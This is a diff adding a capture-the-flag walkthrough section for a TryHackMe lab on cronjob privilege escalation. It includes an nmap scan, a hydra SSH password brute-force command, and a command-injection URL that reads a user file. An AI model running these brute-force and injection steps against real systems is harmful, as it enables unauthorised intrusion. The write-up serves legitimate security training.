@@ -535,3 +535,36 @@ you can do by visiting at this site https://www.urlencoder.org/
 now lets enter this into url http://machine-ip/api/cmd/cat%20%2Fhome%2Fbestadmin%2Fuser.txt
 
 ![day19-4](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day19-4.png)
+
+## Day 20 : Cronjob Privilege Escalation
+
+#### What port is SSH running on?
+
+```bash
+nmap -p1-9999 10.10.251.78
+```
+
+```
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 09:36 EDT
+Nmap scan report for 10.10.251.78
+Host is up (0.20s latency).
+Not shown: 9998 closed ports
+PORT     STATE SERVICE
+****/tcp open  tram
+Nmap done: 1 IP address (1 host up) scanned in 182.66 seconds
+```
+
+#### Crack sam's password and read flag1.txt
+
+use hydra to crack sam's password
+```bash
+hydra -l sam -P ../rockyou.txt ssh://10.10.251.78 -s port
+```
+
+![day20-1](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day20-1.png)
+
+#### Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?
+
+Now if check around we see that flag2 is in ubuntu directory and there's script clean-up.sh which is definetly running by crontab now lets abuse this
+
+![day20-2](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day20-2.png)
